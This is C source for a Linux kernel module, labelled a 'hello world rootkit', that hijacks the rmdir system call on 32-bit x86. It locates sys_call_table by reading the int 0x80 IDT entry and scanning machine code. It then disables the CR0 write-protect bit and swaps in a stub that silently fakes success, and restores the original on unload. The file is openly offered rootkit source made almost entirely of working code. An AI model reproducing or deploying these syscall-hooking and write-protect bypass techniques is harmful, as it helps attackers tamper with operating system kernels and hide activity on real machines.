#include <linux/module.h>
#include <linux/init.h>
#include <asm/unistd.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("leisheyoufu");
MODULE_DESCRIPTION("hello world rootkit world");


//#define CL_DEBUG
#define CL_INFO

#ifdef CL_DEBUG
	#define CL_PRINT(fmt,args...) printk("CL: %s  %d  "fmt,__FILE__,__LINE__,##args)
#else
	#define CL_PRINT(fmt,args...)
#endif

#ifdef CL_INFO
	#define CL_INFO_PRINT(fmt,args...) printk("CL info: %s  %d  "fmt,__FILE__,__LINE__,##args)
#else
	#define CL_INFO_PRINT(fmt,args...)
#endif

struct descriptor_idt
{
        unsigned short offset_low;
        unsigned short ignore1;
        unsigned short ignore2;
        unsigned short offset_high;
};

static struct {
        unsigned short limit;
        unsigned long base;
}__attribute__ ((packed)) idt48;

unsigned long dire_call,dire_exit,after_call;
/* get sys_call_table address */
void *get_sct_addr(unsigned int system_call)
{
    unsigned char *p;
    unsigned long s_c_t;

    p = (unsigned char *) system_call;
    while (!((*p == 0xff) && (*(p+1) == 0x14) && (*(p+2) == 0x85))) // call
        p++;

    dire_call = (unsigned long) p;
    p += 3;
    s_c_t = *((unsigned long *) p);
    p += 4;
    after_call = (unsigned long) p;

    while (*p != 0xfa)     // cli
        p++;

    dire_exit = (unsigned long) p;
    return((void *) s_c_t);
}

// void **sys_call_table = (void **)0xc0996360; // from system map
void **sys_call_table;

int (*sys_orig_rmdir)(const char *path);
int sys_new_rmdir(const char * path)
{
    CL_INFO_PRINT("sys_new_rmdir %s\n",path);
    return 0;
}

static unsigned int clear_cr0(void)
{
    unsigned int cr0 = 0;
    unsigned int ret;
    asm volatile("movl %%cr0, %%eax"
                 :"=a"(cr0)
                );
    ret = cr0;
    cr0 &= 0xfffeffff;
    asm volatile("movl %%eax, %%cr0"
                 :
                 :"a"(cr0)
                );
    return ret;
}
static void setback_cr0(unsigned int val) // ½«cr0ÉèÎªval
{
    asm volatile("movl %%eax, %%cr0"
                 :
                 :"a"(val)
                );
}

static int __init rootkit_init(void)
{
    unsigned int cr0;
    struct descriptor_idt *p_idt80;
    unsigned int system_call_addr;

    __asm__ volatile ("sidt %0": "=m" (idt48));
    p_idt80 = (struct descriptor_idt *)(idt48.base + 8*0x80);
    system_call_addr = (p_idt80->offset_high<<16 | p_idt80->offset_low);
    sys_call_table = get_sct_addr(system_call_addr);
    CL_INFO_PRINT("sys_call_table addr is %x \n",system_call_addr);
    sys_orig_rmdir = sys_call_table[__NR_rmdir];
    CL_INFO_PRINT(" sys_call_table[__NR_rmdir] = %x\n",  (unsigned int)sys_call_table[__NR_rmdir]);
    cr0 = clear_cr0();
    sys_call_table[__NR_rmdir] = sys_new_rmdir;
    setback_cr0(cr0);
    CL_INFO_PRINT(" sys_call_table[__NR_rmdir] = %x\n", (unsigned int)sys_call_table[__NR_rmdir]);
    return 0;
}
static void __exit rootkit_exit(void)
{
    unsigned int cr0;
    cr0 = clear_cr0();
    sys_call_table[__NR_rmdir] = sys_orig_rmdir;
    setback_cr0(cr0);
    CL_INFO_PRINT("rootkit_exit\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);


